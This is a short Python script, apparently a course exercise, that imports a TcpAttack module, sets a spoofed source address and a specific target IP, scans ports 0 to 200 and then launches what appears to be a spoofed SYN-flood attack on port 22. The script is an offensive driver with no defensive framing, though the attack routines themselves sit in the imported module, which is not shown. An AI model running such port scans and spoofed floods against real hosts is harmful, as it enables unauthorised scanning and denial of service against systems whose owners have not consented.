# -*- coding: utf-8 -*-
"""
Created on Tue Mar 30 10:21:03 2021

@author: Alex
"""

from TcpAttack import *

spoofIP = '192.168.4.124'
targetIP = '128.46.4.92'
rangeStart = 0
rangeEnd = 200
port = 22
Tcp = TcpAttack(spoofIP, targetIP)
Tcp.scanTarget(rangeStart, rangeEnd)
if Tcp.attackTarget(port,10):
    print('port was open for attack')